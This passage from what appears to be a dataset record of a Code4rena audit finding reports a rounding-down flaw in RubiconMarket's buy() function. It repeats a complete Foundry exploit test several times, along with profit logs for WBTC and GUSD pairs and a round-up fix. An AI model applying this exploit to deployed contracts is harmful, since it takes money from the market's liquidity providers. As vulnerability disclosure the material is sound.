l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 GUSDCostInUSDC = GUSDSent * 1e6 / 1e2;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + GUSDCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on GUSD pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 20 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: GUSD(2), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"GUSD cost:\", GUSDSent);\n    console.log(\"GUSD cost in USDC:\", GUSDCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n}\n\n```\n\n#### Case 1:  ````WBTC/USDC```` pair\nThe given market parameters and test result for case 1:\n```solidity\n[PASS] test_AttackOnWBTCPair() (gas: 11427870)\nLogs:\n  ==========Attack on WBTC pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 4 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: WBTC(8), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 32104\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  WBTC cost: 300\n  WBTC cost in USDC: 90000\n  Total cost in USDC: 150607\n  USDC received: 179700\n  Profit in USDC: 29093\n  Profit in percentage: 19 %\n```\nFrom the log, we can see a 19% profit in one attack. The absolute profit value is about 0.029 USDC, though it is small, but Optimism confirms transactions instantly, attackers can submit huge number of transactions such as 1M to get 29,000 USDC profit.\n\nOne point needs to be pointed out, market parameters other than L1 gas price are consistent with the actual normal situations. The 4 Gwei L1 gas price is a a relatively low price, and it's a key condition to make the attack be profitable. But this scenario can actually happen, here is some instances when gas price drops below 4 Gwei.\nsource: https://public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard?orgId=1&refresh=5m&viewPanel=6&from=now-1y&to=now&inspect=6&inspectTab=data\n```solidity\n2022/8/21 18:00 | 1.56939\n2022/9/19 18:00 | 2.3536\n2022/9/17 12:00 | 2.63193\n2022/7/31 12:00 | 2.87714\n2022/8/21 12:00 | 2.99122\n2022/7/31 6:00 | 3.03533\n2022/10/5 18:00 | 3.14388\n2022/9/4 18:00 | 3.15065\n2022/10/2 18:00 | 3.18227\n2022/9/4 6:00 | 3.19788\n2022/7/31 18:00 | 3.20089\n2022/8/1 12:00 | 3.22637\n2022/9/4 12:00 | 3.34139\n2022/8/20 18:00 | 3.57428\n2022/9/18 12:00 | 3.57598\n2022/9/22 18:00 | 3.60006\n2022/8/14 18:00 | 3.63901\n2022/9/18 6:00 | 3.72209\n2022/9/12 12:00 | 3.74844\n2022/8/29 0:00 | 3.8843\n2022/8/21 6:00 | 3.94099\n2022/9/25 12:00 | 3.97128\n2022/9/21 18:00 | 3.98098\n2022/8/6 18:00 | 3.98923\n```\n\n#### Case 2:  ````GUSD/USDC```` pair\nThe given market parameters and test result for case 2:\n```solidity\n[PASS] test_AttackOnGUSDPair() (gas: 11427889)\nLogs:\n  ==========Attack on GUSD pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 20 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: GUSD(2), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 160520\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  GUSD cost: 300\n  GUSD cost in USDC: 3000000\n  Total cost in USDC: 3189023\n  USDC received: 5999400\n  Profit in USDC: 2810377\n  Profit in percentage: 88 %\n```\nFor the ````GUSD```` pair, we can see, even on a normal 20 Gwei L1 gas price condition, the attack profit rate is 88%. The absolute profit value in one attack is about 2.8 USDC. Similarly,  attackers can submit huge number of transactions to make a significant profit.\n\n## Tools Used\nManually review\n\n## Recommended Mitigation Steps\nCalculation of ````spend```` should be rounded up.",
      "description": null,
      "impact": "## Impact\nWhen users ```buy()``` from ````RubiconMarket````, their ````spend```` is rounded down. Tokens with small decimas, such as WBTC and GUSD, are vulnerable to rounding error attack. Attackers can exploit it to get risk free profit.\n",
      "mitigation": "## Recommended Mitigation Steps\nCalculation of ````spend```` should be rounded up.\n",
      "poc": "## Proof of Concept\nThe issue arises on L319 of ````buy()````, we can see calculation of ````spend```` is rounded down.\n```solidity\nFile: contracts\\RubiconMarket.sol\n314:     function buy(\n315:         uint256 id,\n316:         uint256 quantity\n317:     ) public virtual can_buy(id) synchronized returns (bool) {\n318:         OfferInfo memory _offer = offers[id];\n319:         uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt; // @audit should rounde up\n...\n447:         return true;\n448:     }\n```\n\nThe following test cases show how attackers can exploit it to get profit.\n\n```solidity\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract MockERC20 is ERC20 {\n    uint8 private decimals_;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) ERC20(_name, _symbol) {\n        decimals_ = _decimals;\n    }\n\n    function decimals() public view override returns (uint8) {\n        return decimals_;\n    }\n\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount * 10 ** decimals_);\n    }\n}\n\n/// @notice proxy isn't used here\ncontract AttackOnRoundingError is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address attacker = address(0x01020304);\n  uint256 WBTCOfferId;\n  uint256 GUSDOfferId;\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  MockERC20 USDC;\n  MockERC20 WBTC;\n  MockERC20 GUSD;\n\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    USDC = new MockERC20(\"Test Stablecoin\", \"USDC\", 6);\n    WBTC = new MockERC20(\"Wrapped BTC\", \"WBTC\", 8);\n    // the top 77th token: https://coinmarketcap.com/currencies/gemini-dollar/\n    GUSD = new MockERC20(\"Gemini USD\", \"GUSD\", 2);\n\n    USDC.mint(address(this), 1_000_000);\n    USDC.approve(address(market), type(uint256).max);\n    // place ask and bid for WBTC/USDC pair at price 30,000 USDC/WBTC\n    WBTCOfferId = market.offer(300000e6, USDC, 10e8, WBTC, address(this), owner);\n\n    // place ask and bid for GUSD/USC pair at price 1 USDC/GUSD\n    GUSDOfferId = market.offer(300000e6, USDC, 300000e2, GUSD, address(this), owner);\n\n\n    WBTC.mint(attacker, 10);\n    vm.prank(attacker);\n    WBTC.approve(address(market), type(uint256).max);\n\n    GUSD.mint(attacker, 100000);\n    vm.prank(attacker);\n    GUSD.approve(address(market), type(uint256).max);\n  }\n\n  function test_AttackOnWBTCPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 WBTCSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 WBTCBalanceBefore = WBTC.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(WBTCOfferId, 599);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 WBTCBalanceAfter = WBTC.balanceOf(attacker);\n      WBTCSent = WBTCBalanceBefore - WBTCBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 4e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 WBTCCostInUSDC = WBTCSent * 30000e6 / 1e8;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + WBTCCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on WBTC pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 4 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: WBTC(8), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"WBTC cost:\", WBTCSent);\n    console.log(\"WBTC cost in USDC:\", WBTCCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n  function test_AttackOnGUSDPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 GUSDSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 GUSDBalanceBefore = GUSD.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(GUSDOfferId, 19_999);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 GUSDBalanceAfter = GUSD.balanceOf(attacker);\n      GUSDSent = GUSDBalanceBefore - GUSDBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 20e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 GUSDCostInUSDC = GUSDSent * 1e6 / 1e2;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + GUSDCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on GUSD pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 20 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: GUSD(2), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"GUSD cost:\", GUSDSent);\n    console.log(\"GUSD cost in USDC:\", GUSDCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n}\n\n```\n\n#### Case 1:  ````WBTC/USDC```` pair\nThe given market parameters and test result for case 1:\n```solidity\n[PASS] test_AttackOnWBTCPair() (gas: 11427870)\nLogs:\n  ==========Attack on WBTC pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 4 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: WBTC(8), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 32104\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  WBTC cost: 300\n  WBTC cost in USDC: 90000\n  Total cost in USDC: 150607\n  USDC received: 179700\n  Profit in USDC: 29093\n  Profit in percentage: 19 %\n```\nFrom the log, we can see a 19% profit in one attack. The absolute profit value is about 0.029 USDC, though it is small, but Optimism confirms transactions instantly, attackers can submit huge number of transactions such as 1M to get 29,000 USDC profit.\n\nOne point needs to be pointed out, market parameters other than L1 gas price are consistent with the actual normal situations. The 4 Gwei L1 gas price is a a relatively low price, and it's a key condition to make the attack be profitable. But this scenario can actually happen, here is some instances when gas price drops below 4 Gwei.\nsource: https://public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard?orgId=1&refresh=5m&viewPanel=6&from=now-1y&to=now&inspect=6&inspectTab=data\n```solidity\n2022/8/21 18:00 | 1.56939\n2022/9/19 18:00 | 2.3536\n2022/9/17 12:00 | 2.63193\n2022/7/31 12:00 | 2.87714\n2022/8/21 12:00 | 2.99122\n2022/7/31 6:00 | 3.03533\n2022/10/5 18:00 | 3.14388\n2022/9/4 18:00 | 3.15065\n2022/10/2 18:00 | 3.18227\n2022/9/4 6:00 | 3.19788\n2022/7/31 18:00 | 3.20089\n2022/8/1 12:00 | 3.22637\n2022/9/4 12:00 | 3.34139\n2022/8/20 18:00 | 3.57428\n2022/9/18 12:00 | 3.57598\n2022/9/22 18:00 | 3.60006\n2022/8/14 18:00 | 3.63901\n2022/9/18 6:00 | 3.72209\n2022/9/12 12:00 | 3.74844\n2022/8/29 0:00 | 3.8843\n2022/8/21 6:00 | 3.94099\n2022/9/25 12:00 | 3.97128\n2022/9/21 18:00 | 3.98098\n2022/8/6 18:00 | 3.98923\n```\n\n#### Case 2:  ````GUSD/USDC```` pair\nThe given market parameters and test result for case 2:\n```solidity\n[PASS] test_AttackOnGUSDPair() (gas: 11427889)\nLogs:\n  ==========Attack on GUSD pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 20 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: GUSD(2), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 160520\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  GUSD cost: 300\n  GUSD cost in USDC: 3000000\n  Total cost in USDC: 3189023\n  USDC received: 5999400\n  Profit in USDC: 2810377\n  Profit in percentage: 88 %\n```\nFor the ````GUSD```` pair, we can see, even on a normal 20 Gwei L1 gas price condition, the attack profit rate is 88%. The absolute profit value in one attack is about 2.8 USDC. Similarly,  attackers can submit huge number of transactions to make a significant profit.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L319\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManually review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nWhen users ```buy()``` from ````RubiconMarket````, their ````spend```` is rounded down. Tokens with small decimas, such as WBTC and GUSD, are vulnerable to rounding error attack. Attackers can exploit it to get risk free profit.\n",
        "recommendation": "## Recommended Mitigation Steps\nCalculation of ````spend```` should be rounded up.\n",
        "poc": "## Proof of Concept\nThe issue arises on L319 of ````buy()````, we can see calculation of ````spend```` is rounded down.\n```solidity\nFile: contracts\\RubiconMarket.sol\n314:     function buy(\n315:         uint256 id,\n316:         uint256 quantity\n317:     ) public virtual can_buy(id) synchronized returns (bool) {\n318:         OfferInfo memory _offer = offers[id];\n319:         uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt; // @audit should rounde up\n...\n447:         return true;\n448:     }\n```\n\nThe following test cases show how attackers can exploit it to get profit.\n\n```solidity\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract MockERC20 is ERC20 {\n    uint8 private decimals_;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) ERC20(_name, _symbol) {\n        decimals_ = _decimals;\n    }\n\n    function decimals() public view override returns (uint8) {\n        return decimals_;\n    }\n\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount * 10 ** decimals_);\n    }\n}\n\n/// @notice proxy isn't used here\ncontract AttackOnRoundingError is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address attacker = address(0x01020304);\n  uint256 WBTCOfferId;\n  uint256 GUSDOfferId;\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  MockERC20 USDC;\n  MockERC20 WBTC;\n  MockERC20 GUSD;\n\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    USDC = new MockERC20(\"Test Stablecoin\", \"USDC\", 6);\n    WBTC = new MockERC20(\"Wrapped BTC\", \"WBTC\", 8);\n    // the top 77th token: https://coinmarketcap.com/currencies/gemini-dollar/\n    GUSD = new MockERC20(\"Gemini USD\", \"GUSD\", 2);\n\n    USDC.mint(address(this), 1_000_000);\n    USDC.approve(address(market), type(uint256).max);\n    // place ask and bid for WBTC/USDC pair at price 30,000 USDC/WBTC\n    WBTCOfferId = market.offer(300000e6, USDC, 10e8, WBTC, address(this), owner);\n\n    // place ask and bid for GUSD/USC pair at price 1 USDC/GUSD\n    GUSDOfferId = market.offer(300000e6, USDC, 300000e2, GUSD, address(this), owner);\n\n\n    WBTC.mint(attacker, 10);\n    vm.prank(attacker);\n    WBTC.approve(address(market), type(uint256).max);\n\n    GUSD.mint(attacker, 100000);\n    vm.prank(attacker);\n    GUSD.approve(address(market), type(uint256).max);\n  }\n\n  function test_AttackOnWBTCPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 WBTCSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 WBTCBalanceBefore = WBTC.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(WBTCOfferId, 599);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 WBTCBalanceAfter = WBTC.balanceOf(attacker);\n      WBTCSent = WBTCBalanceBefore - WBTCBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 4e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 WBTCCostInUSDC = WBTCSent * 30000e6 / 1e8;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + WBTCCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on WBTC pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 4 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: WBTC(8), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"WBTC cost:\", WBTCSent);\n    console.log(\"WBTC cost in USDC:\", WBTCCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n  function test_AttackOnGUSDPair() public {\n    uint256 l2GasCost;\n    uint256 USDCReceived;\n    uint256 GUSDSent;\n    { // stack too deep\n      uint256 USDCBalanceBefore = USDC.balanceOf(attacker);\n      uint256 GUSDBalanceBefore = GUSD.balanceOf(attacker);\n\n      vm.startPrank(attacker);\n      uint256 gasBefore = gasleft();\n      for (uint256 i; i < 300; ++i) { // sum of gas can't excess block gas limit of 15M\n          market.buy(GUSDOfferId, 19_999);\n      }\n      uint256 gasAfter = gasleft();\n      vm.stopPrank();\n      l2GasCost = gasBefore - gasAfter;\n      uint256 USDCBalanceAfter = USDC.balanceOf(attacker);\n      USDCReceived = USDCBalanceAfter - USDCBalanceBefore;\n      uint256 GUSDBalanceAfter = GUSD.balanceOf(attacker);\n      GUSDSent = GUSDBalanceBefore - GUSDBalanceAfter;\n    }\n\n    // reference https://dune.com/queries/508560/961244\n    uint256 l1GasCost = 4013;\n    uint256 l1GasPrice = 20e9;\n    uint256 l2GasPrice = 0.001e9;\n    uint256 ETHPrice = 2000e6;\n    uint256 l1GasCostInUSDC = l1GasCost * l1GasPrice * ETHPrice / 1e18;\n    uint256 l2GasCostInUSDC = l2GasCost * l2GasPrice * ETHPrice / 1e18;\n    uint256 GUSDCostInUSDC = GUSDSent * 1e6 / 1e2;\n    uint256 totalCostInUSDC = l1GasCostInUSDC + l2GasCostInUSDC + GUSDCostInUSDC;\n    uint256 profitInUSDC = USDCReceived - totalCostInUSDC;\n    uint256 profitInPercentage = 100 * profitInUSDC / totalCostInUSDC;\n\n    console.log(\"==========Attack on GUSD pair==========\");\n    console.log(\"Given price: 2000 USDC/ETH, 30,000 USDC/BTC\");\n    console.log(\"Given L1(Ethereum) gas price: 20 Gwei\");\n    console.log(\"Given L2(Optimism) gas price: 0.001 Gwei\");\n    console.log(\"Given decimals: GUSD(2), USDC(6)\");\n    console.log(\"L1 gas cost:\", l1GasCost);\n    console.log(\"L1 gas cost in USDC:\", l1GasCostInUSDC);\n    console.log(\"L2 gas cost:\", l2GasCost);\n    console.log(\"L2 gas cost in USDC:\", l2GasCostInUSDC);\n    console.log(\"GUSD cost:\", GUSDSent);\n    console.log(\"GUSD cost in USDC:\", GUSDCostInUSDC);\n    console.log(\"Total cost in USDC:\", totalCostInUSDC);\n    console.log(\"USDC received:\", USDCReceived);\n    console.log(\"Profit in USDC:\", profitInUSDC);\n    console.log(\"Profit in percentage:\", profitInPercentage, \"%\");\n  }\n\n}\n\n```\n\n#### Case 1:  ````WBTC/USDC```` pair\nThe given market parameters and test result for case 1:\n```solidity\n[PASS] test_AttackOnWBTCPair() (gas: 11427870)\nLogs:\n  ==========Attack on WBTC pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 4 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: WBTC(8), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 32104\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  WBTC cost: 300\n  WBTC cost in USDC: 90000\n  Total cost in USDC: 150607\n  USDC received: 179700\n  Profit in USDC: 29093\n  Profit in percentage: 19 %\n```\nFrom the log, we can see a 19% profit in one attack. The absolute profit value is about 0.029 USDC, though it is small, but Optimism confirms transactions instantly, attackers can submit huge number of transactions such as 1M to get 29,000 USDC profit.\n\nOne point needs to be pointed out, market parameters other than L1 gas price are consistent with the actual normal situations. The 4 Gwei L1 gas price is a a relatively low price, and it's a key condition to make the attack be profitable. But this scenario can actually happen, here is some instances when gas price drops below 4 Gwei.\nsource: https://public-grafana.optimism.io/d/9hkhMxn7z/public-dashboard?orgId=1&refresh=5m&viewPanel=6&from=now-1y&to=now&inspect=6&inspectTab=data\n```solidity\n2022/8/21 18:00 | 1.56939\n2022/9/19 18:00 | 2.3536\n2022/9/17 12:00 | 2.63193\n2022/7/31 12:00 | 2.87714\n2022/8/21 12:00 | 2.99122\n2022/7/31 6:00 | 3.03533\n2022/10/5 18:00 | 3.14388\n2022/9/4 18:00 | 3.15065\n2022/10/2 18:00 | 3.18227\n2022/9/4 6:00 | 3.19788\n2022/7/31 18:00 | 3.20089\n2022/8/1 12:00 | 3.22637\n2022/9/4 12:00 | 3.34139\n2022/8/20 18:00 | 3.57428\n2022/9/18 12:00 | 3.57598\n2022/9/22 18:00 | 3.60006\n2022/8/14 18:00 | 3.63901\n2022/9/18 6:00 | 3.72209\n2022/9/12 12:00 | 3.74844\n2022/8/29 0:00 | 3.8843\n2022/8/21 6:00 | 3.94099\n2022/9/25 12:00 | 3.97128\n2022/9/21 18:00 | 3.98098\n2022/8/6 18:00 | 3.98923\n```\n\n#### Case 2:  ````GUSD/USDC```` pair\nThe given market parameters and test result for case 2:\n```solidity\n[PASS] test_AttackOnGUSDPair() (gas: 11427889)\nLogs:\n  ==========Attack on GUSD pair==========\n  Given price: 2000 USDC/ETH, 30,000 USDC/BTC\n  Given L1(Ethereum) gas price: 20 Gwei\n  Given L2(Optimism) gas price: 0.001 Gwei\n  Given decimals: GUSD(2), USDC(6)\n  L1 gas cost: 4013\n  L1 gas cost in USDC: 160520\n  L2 gas cost: 14251627\n  L2 gas cost in USDC: 28503\n  GUSD cost: 300\n  GUSD cost in USDC: 3000000\n  Total cost in USDC: 3189023\n  USDC received: 5999400\n  Profit in USDC: 2810377\n  Profit in percentage: 88 %\n```\nFor the ````GUSD```` pair, we can see, even on a normal 20 Gwei L1 gas price condition, the attack profit rate is 88%. The absolute profit value in one attack is about 2.8 USDC. Similarly,  attackers can submit huge number of transactions to make a significant profit.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L319\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManually review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L319\n\n\n# Vulnerability details\n\n## Impact\nWhen users ```buy()``` from ````RubiconMarket````, their ````spend```` is rounded down. Tokens with small decimas, such as WBTC and GUSD, are vulnerable to rounding error attack. Attackers can exploit it to get risk free profit.\n\n## Proof of Concept\nThe issue arises on L319 of ````buy()````, we can see calculation of ````spend```` is rounded down.\n```solidity\nFile: contracts\\RubiconMarket.sol\n314:     function buy(\n315:         uint256 id,\n316:         uint256 quantity\n317:     ) public virtual can_buy(id) synchronized returns (bool) {\n318:         OfferInfo memory _offer = offers[id];\n319:         uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt; // @audit should rounde up\n...\n447:         return true;\n448:     }\n```\n\nThe following test cases show how attackers can exploit it to get profit.\n\n```solidity\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract MockERC20 is ERC20 {\n    uint8 private decimals_;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) ERC20(_name, _symbol) {\n        decimals_ = _decimals;\n    }\n\n    function decimals() public view override returns (uint8) {\n        return decimals_;\n    }\n\n    function mint(address account, uint256 amount) external {\n        _mint(account, amount * 10 ** decimals_);\n    }\n}\n\n/// @notice proxy isn't used here\ncontract AttackOnRoundingError is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address attacker = address(0x01020304);\n  uint256 WBTCOfferId;\n  uint256 GUSDOfferId;\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  MockERC20 USDC;\n  MockERC20 WBTC;\n  MockERC20 GUSD;\n\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    USDC = new MockERC20(\"Test Stablecoin\", \"USDC\", 6);\n    WBTC = new MockERC20(\"Wrapped BTC\", \"WBTC\", 8);\n    // the top 77th token: https://coinmarketcap.com/currencies/gemini-dollar/\n    GUSD = new MockERC20(\"Gemini USD\", \"GUSD\", 2);\n\n    USDC.mint(address(this), 1_000_000);\n    